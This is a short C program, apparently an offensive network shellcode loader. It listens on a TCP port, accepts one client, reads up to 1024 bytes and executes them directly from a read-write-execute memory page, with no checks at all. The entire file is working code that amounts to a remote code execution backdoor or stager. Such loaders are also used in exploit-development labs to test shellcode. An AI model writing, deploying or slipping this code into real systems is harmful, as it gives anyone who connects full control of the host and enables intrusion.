#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include <sys/types.h> 
#include <sys/socket.h>
#include <netinet/in.h>
 
void error(const char *msg) {
  perror(msg);
  exit(1);
}
 
void execute(char *buffer) {
  void (*mem)() = mmap(0, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
  memcpy(mem, buffer, strlen(buffer));
  (*mem)();
}
 
int main(int argc, char *argv[]) {
  char buffer[1024];
  int serverfd, clientfd;
  socklen_t client_len;
  struct sockaddr_in server_addr, client_addr;
  client_len = sizeof(client_addr);

  if (argc != 2) {
    printf("Usage: %s <port>\n", argv[0]);
    exit(1);
  }

  server_addr.sin_family = AF_INET;
  server_addr.sin_addr.s_addr = INADDR_ANY;
  server_addr.sin_port = htons(atoi(argv[1]));

  if((serverfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) 
    error(" [!] opening socket");

  if (bind(serverfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) 
    error(" [!] bind()");

  if (listen(serverfd, 0) < 0)
    error(" [!] listen()");

  if ((clientfd = accept(serverfd, (struct sockaddr *)&client_addr, &client_len)) < 0)
    error(" [!] accept()");

  printf(" [*] Received %d bytes, executing.\n", read(clientfd,buffer,1024));
  execute(buffer);
 
  printf(" [*] Closing sockets.\n");
  close(clientfd);
  close(serverfd);
  return 0; 
}
